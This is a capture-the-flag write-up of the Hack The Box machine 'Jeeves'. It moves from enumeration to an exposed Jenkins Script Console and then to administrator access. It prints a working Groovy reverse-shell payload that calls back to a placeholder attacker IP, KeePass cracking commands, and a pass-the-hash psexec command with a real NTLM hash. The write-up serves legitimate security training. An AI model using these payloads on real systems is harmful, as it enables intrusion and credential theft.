## About Jeeves

**Name:** Jeeves

**Machine:** https://app.hackthebox.com/machines/Jeeves

**Difficulty:** Medium

**OS:** Windows

**Target IP:** 10.129.67.197

---
## Recon

I'll run a standard nmap scan to see what ports and services are open on the target:

```
sudo nmap -sC -sV -oA nmap/Jeeves -v 10.129.67.197
```

This looks like a standalone Windows machine rather than a domain member, since there's no Kerberos or LDAP in the results, and the workgroup is just listed as `WORKGROUP`. 

```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 4h59m59s
| smb2-time: 
|   date: 2026-08-20T17:53:13
|_  start_date: 2026-08-20T17:51:01
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

I check quickly for guest and null authentication on `SMB`, but both are disabled, so that avenue is closed for now.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_18-27.png)

## Web Enumeration

Visiting port `80` shows a website called "Ask Jeeves," styled to look like an old search engine.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_18-31.png)

Submitting anything into the search bar just throws an error.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_18-35.png)

There's no hardcoded credentials sitting in the page source, and directory brute forcing against this site doesn't return anything.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_18-49.png)

Visiting port `50000` directly just gives an HTTP 404 error.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_18-46.png)

I run a directory brute force against this port instead, and this time it turns up something:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -u http://10.129.67.197:50000/FUZZ
```

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_19-06.png)

## Foothold

Navigating to `http://10.129.67.197:50000/askjeeves/` reveals a Jenkins instance sitting behind that path

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_18-53.png)

From here, I can browse to the Script Console, which is normally reachable at `/script` on any Jenkins instance where we already have admin-level access. This console lets us run arbitrary Groovy code on the server, which effectively works the same as having a web shell.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_19-09.png)

Before dropping a reverse shell payload in, I start a listener on my attacking machine so I don't miss the callback.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_19-21.png)

I paste this payload into the script console and hit run to trigger the reverse shell:

```
String host="<ATTACKER_IP>";
int port=8443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_19-19.png)

Back on my listener, I get a connection almost immediately.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_19-22.png)

I go looking for the user flag, and find it sitting inside `kohsuke`'s home directory.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_19-35.png)

## Privilege Escalation

Since there don't seem to be any other users on this box, my next goal is escalating straight to `administrator`. Poking around `kohsuke`'s Documents folder, I find a file called `CEH.kdbx`.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_19-57.png)

A `.kdbx` file is the format used by KeePass, a local password manager. If I can crack the master password protecting it, there's a good chance it holds credentials worth using, possibly even for `administrator`. Getting this file off the box is a little trickier than a normal download, though, so I work through it using Jenkins itself.

First, I visit the Jenkins main page and click "create new jobs."

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-12.png)

I give the job a name, select "Freestyle Project," and click OK.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-09.png)

Then I click "Save" to create it.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-13.png)

The job is created, but I still need to build it once before its workspace becomes usable.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-23.png)

After that, I can click into "Workspace."

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-24.png)

Now I need to figure out where this Jenkins workspace actually lives on the target.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-26.png)

After a bit of searching, I find it under `C:\Users\Administrator\.jenkins\workspace`.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-31.png)

I copy the `CEH.kdbx` file into that workspace directory:

```
copy C:\Users\kohsuke\Documents\CEH.kdbx C:\Users\Administrator\.jenkins\workspace\test
```

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-36.png)

Back in the browser, the file now shows up inside my job's workspace, so I download it from there.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-37.png)

Next, I need to pull a crackable hash out of it before I can attack the master password. I use `keepass2john` for that, then hand the hash to `john`:

```
keepass2john CEh.kdbx > CEH.hash
john --wordlist=\usr\share\wordlists\rockyou.txt CEH.hash
```

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-45.png)

This cracks the master password to `moonshine1`. To actually open the vault with it, I use `keepassxc`:

```
sudo apt install keepassxc -y
keepassxc CEH.kdbx
```

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-52.png)

Inside, there are quite a few stored credentials, and one entry labeled "Backup stuff" contains what looks like an NTLM hash.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_20-55.png)

I try that hash against `administrator`, and it authenticates successfully.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_21-01.png)

I try reading the root flag through `netexec`, but it fails, since the flag isn't actually sitting in the location I expected.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_21-06.png)

To dig further, I get a proper shell as `administrator` through `psexec` instead:

```
impacket-psexec administrator@10.129.67.197 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

There's still no root flag visible in this directory, but there is a file called `hm.txt`, which hints that the flag is being hidden somewhere tied to this file rather than sitting out in the open.

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_21-13.png)

Checking the machine's description mentions Alternate Data Streams. `ADS` is an NTFS filesystem feature that lets a single file carry more than one "stream" of data attached to it, meaning there can be hidden content tied to a file beyond just its normal, visible contents.

I can list every stream attached to the files in this directory using `/R`:

```
dir /R
```

![](Assets/2026-08-20_21-27%201.png)

Sure enough, `hm.txt` has an extra stream attached to it, and I can read it by piping it into `more`:

```
more < hm.txt:root.txt:$DATA
```

![](Writeups/Hack%20The%20Box/Assets/2026-08-20_21-30.png)

---